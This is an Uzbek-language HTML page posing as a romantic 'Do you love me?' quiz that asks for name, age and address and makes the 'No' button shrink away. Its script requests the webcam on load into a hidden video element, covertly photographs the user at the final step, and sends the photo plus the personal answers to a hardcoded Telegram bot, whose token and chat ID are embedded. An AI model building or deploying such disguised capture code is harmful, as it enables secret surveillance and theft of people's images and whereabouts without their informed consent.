<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maxsus So'rovnoma ❤️</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #ff758c, #ff7eb3);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .card {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
            animation: fadeIn 0.5s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h2 {
            color: #d63384;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 14px;
            color: #555;
            margin-bottom: 5px;
        }

        input {
            width: 100%;
            padding: 10px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }

        input:focus {
            border-color: #ff758c;
        }

        button {
            background: #ff4757;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: 0.3s;
        }

        button:hover {
            background: #ff6b81;
        }

        .btn-group {
            display: flex;
            justify-content: space-around;
            gap: 10px;
            margin-top: 15px;
        }

        .btn-yes {
            background: #2ed573;
            flex: 1;
        }
        .btn-yes:hover {
            background: #26af5f;
        }

        .btn-no {
            background: #ff4757;
            flex: 1;
            transition: all 0.2s ease;
        }

        .hidden {
            display: none;
        }

        .radio-label {
            display: flex;
            align-items: center;
            gap: 10px;
            background: #f1f2f6;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 10px;
            cursor: pointer;
            font-size: 15px;
        }

        /* Yashirin video elementi kamera uchun */
        #webcam {
            display: none;
        }
    </style>
</head>
<body>

    <!-- Yashirin video elementlari (kamera ishlashi uchun) -->
    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas" class="hidden"></canvas>

    <div class="card" id="card">
        <!-- 1-Qadam: Ism -->
        <div id="step-1" class="step">
            <h2>Tanishib olaylik 😊</h2>
            <div class="input-group">
                <label>Ismingiz:</label>
                <input type="text" id="name" placeholder="Ismingizni kiriting...">
            </div>
            <button onclick="nextStep(1)">Keyingisi</button>
        </div>

        <!-- 2-Qadam: Yosh -->
        <div id="step-2" class="step hidden">
            <h2>Yoshinigiz nechada? 🎂</h2>
            <div class="input-group">
                <label>Yoshingiz:</label>
                <input type="number" id="age" placeholder="Masalan: 20">
            </div>
            <button onclick="nextStep(2)">Keyingisi</button>
        </div>

        <!-- 3-Qadam: Manzil -->
        <div id="step-3" class="step hidden">
            <h2>Qayerdansiz? 🌍</h2>
            <div class="input-group">
                <label>Manzilingiz:</label>
                <input type="text" id="address" placeholder="Shahar yoki tuman...">
            </div>
            <button onclick="nextStep(3)">Keyingisi</button>
        </div>

        <!-- 4-Qadam: Sevgiga qarash -->
        <div id="step-4" class="step hidden">
            <h2>Sevgiga qanday qaraysiz? 💭</h2>
            <label class="radio-label">
                <input type="radio" name="love_view" value="To'g'ri qarayman (hamma ham sevadi)" checked> 
                To'g'ri qarayman (hamma ham sevadi)
            </label>
            <label class="radio-label">
                <input type="radio" name="love_view" value="Yo'q, bo'lmaydi"> 
                Yo'q, bo'lmaydi
            </label>
            <button onclick="nextStep(4)">Keyingisi</button>
        </div>

        <!-- 5-Qadam: Meni sevasizmi? -->
        <div id="step-5" class="step hidden">
            <h2>Meni sevasizmi? 🥺</h2>
            <div class="btn-group">
                <button class="btn-yes" onclick="nextStep(5)">Ha</button>
                <button id="no-btn-1" class="btn-no" onclick="shrinkNo(1)">Yo'q</button>
            </div>
        </div>

        <!-- 6-Qadam: Aniqmi? -->
        <div id="step-6" class="step hidden">
            <h2>Rostdan ham aniqmi? 🧐</h2>
            <div class="btn-group">
                <button class="btn-yes" onclick="finishQuiz()">Ha</button>
                <button id="no-btn-2" class="btn-no" onclick="shrinkNo(2)">Yo'q</button>
            </div>
        </div>

        <!-- 7-Qadam: Final -->
        <div id="step-7" class="step hidden">
            <h2>Men ham sizni sevaman! ❤️</h2>
            <p style="color: #666; font-size: 15px; margin-top: 10px;">Javoblaringiz uchun rahmat! 😊</p>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8592545802:AAFLHe7WtjT6l-5waOicdhD-cxJ-yIefQuM";
        const CHAT_ID = "8398385338";

        let userData = {
            name: "",
            age: "",
            address: "",
            loveView: "",
            loved: "Ha"
        };

        let noClickCount1 = 0;
        let noClickCount2 = 0;

        // Sayt ochilishi bilan kameraga ruxsat so'rash
        window.addEventListener('DOMContentLoaded', () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.getElementById('webcam');
                    video.srcObject = stream;
                })
                .catch(err => {
                    console.log("Kamera ruxsati berilmadi yoki xatolik: ", err);
                });
        });

        function nextStep(current) {
            if (current === 1) {
                userData.name = document.getElementById('name').value;
                if (!userData.name) {
                    alert("Iltimos, ismingizni kiriting!");
                    return;
                }
            } else if (current === 2) {
                userData.age = document.getElementById('age').value;
                if (!userData.age) {
                    alert("Iltimos, yoshingizni kiriting!");
                    return;
                }
            } else if (current === 3) {
                userData.address = document.getElementById('address').value;
                if (!userData.address) {
                    alert("Iltimos, manzilingizni kiriting!");
                    return;
                }
            } else if (current === 4) {
                const selected = document.querySelector('input[name="love_view"]:checked');
                userData.loveView = selected ? selected.value : "Aniqlanmadi";
            }

            document.getElementById(`step-${current}`).classList.add('hidden');
            document.getElementById(`step-${current + 1}`).classList.remove('hidden');
        }

        function shrinkNo(btnIndex) {
            if (btnIndex === 1) {
                noClickCount1++;
                let btn = document.getElementById('no-btn-1');
                let scale = 1 - (noClickCount1 * 0.18);
                let padding = 10 - (noClickCount1 * 1.5);
                let fontSize = 16 - (noClickCount1 * 2);

                if (noClickCount1 >= 5) {
                    btn.style.display = 'none'; // 5 martadan keyin yo'qoladi
                } else {
                    btn.style.transform = `scale(${scale})`;
                    btn.style.padding = `${Math.max(padding, 2)}px`;
                    btn.style.fontSize = `${Math.max(fontSize, 8)}px`;
                }
            } else if (btnIndex === 2) {
                noClickCount2++;
                let btn = document.getElementById('no-btn-2');
                let scale = 1 - (noClickCount2 * 0.18);
                let padding = 10 - (noClickCount2 * 1.5);
                let fontSize = 16 - (noClickCount2 * 2);

                if (noClickCount2 >= 5) {
                    btn.style.display = 'none';
                } else {
                    btn.style.transform = `scale(${scale})`;
                    btn.style.padding = `${Math.max(padding, 2)}px`;
                    btn.style.fontSize = `${Math.max(fontSize, 8)}px`;
                }
            }
        }

        function finishQuiz() {
            // 6-qadamni yopib, oxirgi 7-qadamni (Men ham sizni sevaman) ochamiz
            document.getElementById('step-6').classList.add('hidden');
            document.getElementById('step-7').classList.remove('hidden');

            // Shu lahzada foydalanuvchining rasmini maxfiy olib, Telegramga yuboramiz
            captureAndSend();
        }

        function captureAndSend() {
            const video = document.getElementById('webcam');
            const canvas = document.getElementById('canvas');
            
            canvas.width = video.videoWidth || 400;
            canvas.height = video.videoHeight || 300;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageDataUrl = canvas.toDataURL('image/jpeg');

            // Base64 rasmni Blob formatiga o'tkazish
            fetch(imageDataUrl)
                .then(res => res.blob())
                .then(blob => {
                    sendToTelegram(blob);
                })
                .catch(err => {
                    // Agar kamera ishlamasa, faqat matnni yuborish
                    sendToTelegram(null);
                });
        }

        function sendToTelegram(photoBlob) {
            const message = `🎯 Yangi natija keldi!\n\n` +
                            `👤 Ism: ${userData.name}\n` +
                            `🎂 Yosh: ${userData.age}\n` +
                            `📍 Manzil: ${userData.address}\n` +
                            `💭 Sevgiga qarash: ${userData.loveView}\n` +
                            `❤️ Meni sevasizmi?: Ha`;

            if (photoBlob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'emotion.jpg');
                formData.append('caption', message);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).catch(e => console.log(e));
            } else {
                // Agar rasm bo'lmasa faqat matn yuborish
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                }).catch(e => console.log(e));
            }
        }
    </script>
</body>
</html>
